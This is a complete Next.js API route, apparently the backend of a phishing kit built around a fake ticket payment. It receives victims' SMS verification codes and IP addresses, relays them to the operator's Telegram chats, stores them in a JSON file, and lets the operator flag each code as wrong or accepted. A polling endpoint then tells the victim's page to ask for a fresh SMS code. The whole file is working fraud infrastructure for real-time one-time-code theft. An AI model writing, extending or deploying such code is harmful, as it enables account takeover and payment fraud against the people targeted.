import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { getCodeErrorFlag, getCodeSuccessFlag } from './codeErrorStore';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_IDS = process.env.CHAT_IDS?.split(',') || [];
const NOTIFICATIONS_FILE = path.join(process.cwd(), 'notifications.json');

// Инициализация файла уведомлений
if (!fs.existsSync(NOTIFICATIONS_FILE)) {
  fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify([], null, 2));
}

// Чтение уведомлений из файла
function readNotifications() {
  try {
    const data = fs.readFileSync(NOTIFICATIONS_FILE, 'utf-8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading notifications:', error);
    return [];
  }
}

// Запись уведомлений в файл
function writeNotifications(notifications: any[]) {
  try {
    fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify(notifications, null, 2));
  } catch (error) {
    console.error('Error writing notifications:', error);
  }
}

// Функция для отправки сообщения в Telegram
async function sendTelegramMessage(message: string) {
  if (!TELEGRAM_TOKEN || CHAT_IDS.length === 0) {
    console.error('Telegram configuration is missing');
    return;
  }

  try {
    for (const chatId of CHAT_IDS) {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      });

      if (!response.ok) {
        console.error(`Failed to send message to chat ${chatId}:`, await response.text());
      }
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
}

// Функция для настройки вебхука
async function setupWebhook() {
  if (!TELEGRAM_TOKEN) {
    console.error('Telegram token is missing');
    return;
  }

  try {
    const webhookUrl = `${process.env.NEXT_PUBLIC_BASE_URL}/api/notify/webhook`;
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl
      })
    });

    if (!response.ok) {
      console.error('Failed to set webhook:', await response.text());
      return;
    }

    // Отправляем тестовое сообщение
    await sendTelegramMessage('🔄 Система перезапущена');
  } catch (error) {
    console.error('Error setting up webhook:', error);
  }
}

// Настраиваем вебхук при инициализации
setupWebhook();

function getClientIp(req: NextRequest) {
  const xff = req.headers.get('x-forwarded-for');
  if (xff) return xff.split(',')[0].trim();
  return req.ip || 'Unknown';
}

export async function GET(req: NextRequest) {
  // Polling для ошибки кода
  if (req.nextUrl.searchParams.get('check_code_error')) {
    const ip = getClientIp(req);
    console.log('Checking code status for IP:', ip);
    const hasError = getCodeErrorFlag(ip);
    const isSuccess = getCodeSuccessFlag(ip);
    
    if (hasError) {
      console.log('Code error flag found for IP:', ip);
      return NextResponse.json({ codeError: 'Код введен неверно или устарел, введите новый поступивший смс код' });
    }
    
    if (isSuccess) {
      console.log('Code success flag found for IP:', ip);
      return NextResponse.json({ codeSuccess: true });
    }
    
    return NextResponse.json({ codeError: null, codeSuccess: false });
  }
  return NextResponse.json({});
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { action, ip, code, ticketNumber } = body;

    if (!action) {
      return NextResponse.json({ ok: false, error: 'Missing action' }, { status: 400 });
    }

    let message = '';
    let notificationType = '';

    switch (action) {
      case 'sms_code':
        if (!ip || !code) {
          return NextResponse.json({ ok: false, error: 'Missing IP or code' }, { status: 400 });
        }
        message = `🔐 <b>Новый код:</b>\n🌍 <b>IP:</b> ${ip}\n🔑 <b>Код:</b> ${code}`;
        notificationType = 'sms_code';
        break;

      case 'payment_success':
        if (!ip || !ticketNumber) {
          return NextResponse.json({ ok: false, error: 'Missing IP or ticket number' }, { status: 400 });
        }
        message = `✅ <b>Успешная оплата:</b>\n🌍 <b>IP:</b> ${ip}\n🎫 <b>Номер билета:</b> ${ticketNumber}`;
        notificationType = 'payment';
        break;

      case 'set_error':
        if (!ip) {
          return NextResponse.json({ ok: false, error: 'Missing IP' }, { status: 400 });
        }
        message = `❌ <b>Ошибка кода:</b>\n🌍 <b>IP:</b> ${ip}`;
        notificationType = 'error';
        break;

      case 'set_success':
        if (!ip) {
          return NextResponse.json({ ok: false, error: 'Missing IP' }, { status: 400 });
        }
        message = `✅ <b>Успешный код:</b>\n🌍 <b>IP:</b> ${ip}`;
        notificationType = 'success';
        break;

      default:
        return NextResponse.json({ ok: false, error: 'Unknown action' }, { status: 400 });
    }

    // Отправляем сообщение в Telegram
    await sendTelegramMessage(message);

    // Сохраняем уведомление в файл
    const notifications = readNotifications();
    notifications.push({
      id: Date.now().toString(),
      type: notificationType,
      data: { ip, code, ticketNumber },
      status: 'pending',
      timestamp: new Date().toISOString()
    });
    writeNotifications(notifications);

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Error handling notification:', error);
    return NextResponse.json({ ok: false, error: 'Internal server error' }, { status: 500 });
  }
} 